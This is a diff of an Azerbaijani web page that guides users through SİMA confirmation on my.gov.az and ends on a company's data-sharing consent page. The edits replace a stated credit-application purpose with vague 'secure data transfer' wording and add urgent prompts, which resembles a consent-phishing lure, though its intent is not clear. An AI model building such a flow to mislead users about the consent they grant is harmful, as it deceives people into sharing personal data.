@@ -56,10 +56,9 @@
             display: flex;
             padding: 20px 5%;
             gap: 30px;
-            flex-direction: row; /* Masaüstü üçün yan-yana */
+            flex-direction: row;
         }
 
-        /* Sidebar: Mobil üçün yuxarıya qalxacaq */
         .sidebar { 
             width: 280px; 
             flex-shrink: 0;
@@ -83,11 +82,10 @@
             align-items: center;
         }
 
-        /* Hero Content */
         .hero-content { flex: 1; }
         
         .hero-title { 
-            font-size: clamp(28px, 5vw, 48px); /* Dinamik font ölçüsü */
+            font-size: clamp(26px, 4vw, 42px); 
             font-weight: 800; 
             line-height: 1.2; 
             margin-bottom: 20px; 
@@ -104,6 +102,16 @@
             max-width: 500px;
         }
 
+        .important-note {
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
+            color: #fff;
+            margin-top: 15px;
+            border-left: 4px solid var(--emba-orange);
+        }
+
         .btn-sima {
             background-color: var(--emba-orange);
             color: white;
@@ -116,9 +124,9 @@
             width: 100%;
             transition: 0.3s;
             box-shadow: 0 4px 15px rgba(255, 179, 0, 0.3);
+            margin-top: 15px;
         }
 
-        /* Responsive Breakpoints */
         @media (max-width: 992px) {
             .container { flex-direction: column; }
             .sidebar { width: 100%; }
@@ -127,7 +135,6 @@
             header { justify-content: center; gap: 20px; }
         }
 
-        /* Modal Responsivliyi */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -221,13 +228,16 @@
 
     <div class="hero-content">
         <div class="hero-title">
-            MƏLUMATLARINIZI <br> <span>SİMA İLƏ TƏSDİQLƏYİN</span>
+            <span>SİMA İLƏ MY.GOV.AZ-A DAXİL OLUN <br> VƏ İCAZƏLƏRİ TƏSDİQLƏYİN</span>
         </div>
         
         <div class="sima-trigger-card">
-            <p style="margin-bottom: 20px; font-size: 15px; line-height: 1.5;">
-                Kredit müraciətinizi tamamlamaq üçün SİMA vasitəsilə biometrik təsdiqləmə tələb olunur.
+            <p style="margin-bottom: 10px; font-size: 16px; line-height: 1.5; font-weight: 500;">
+                Məlumatlarınızın təhlükəsiz ötürülməsi üçün SİMA vasitəsilə təsdiqləmə tələb olunur.
             </p>
+            <div class="important-note">
+                Vacib: Təsdiqləmə bitdikdən sonra mütləq bu səhifəyə geri qayıdın.
+            </div>
             <button class="btn-sima" onclick="openSimaModal()">TƏSDİQLƏMƏNİ BAŞLAT</button>
         </div>
     </div>
@@ -265,21 +275,18 @@
     function closeSimaModal() { modal.style.display = 'none'; }
 
     function handleStart() {
-        // Yaddaşda prosesi aktiv edirik
         localStorage.setItem('sima_onboarding_active', 'true');
         window.open('https://my.gov.az/settings', '_blank');
         
-        // Modal daxilində UI dəyişir
         btnStart.style.display = 'none';
         btnFinish.style.display = 'block';
         guideMsg.innerHTML = "<b>İndi SİMA ilə təsdiq edin</b>";
-        stepTxt.innerHTML = "<b>Addım 2:</b> SİMA tətbiqində təsdiq verdikdən sonra bu pəncərəyə qayıdın.";
+        stepTxt.innerHTML = "<b style='color:#d32f2f'>DİQQƏT:</b> SİMA tətbiqində təsdiq verdikdən sonra <b>mütləq bu pəncərəyə qayıdın</b> və yaşıl düyməyə basın.";
     }
 
-    // Taba qayıdışın izlənilməsi (Masaüstü və Mobil üçün)
     window.onfocus = function() {
         if (localStorage.getItem('sima_onboarding_active') === 'true') {
-            btnFinish.style.boxShadow = "0 0 15px rgba(67, 160, 71, 0.5)";
+            btnFinish.style.boxShadow = "0 0 15px rgba(67, 160, 71, 0.7)";
             btnFinish.style.animation = "pulse 1.5s infinite";
         }
     };
@@ -289,7 +296,6 @@
         window.location.href = 'https://my.gov.az/history/consent/companies/104';
     }
 
-    // Modalın kənarını klikləyəndə bağlanması
     window.onclick = function(event) {
         if (event.target == modal) closeSimaModal();
     }
@@ -298,7 +304,7 @@
 <style>
     @keyframes pulse {
         0% { transform: scale(1); }
-        50% { transform: scale(1.02); }
+        50% { transform: scale(1.05); }
         100% { transform: scale(1); }
     }
 </style>
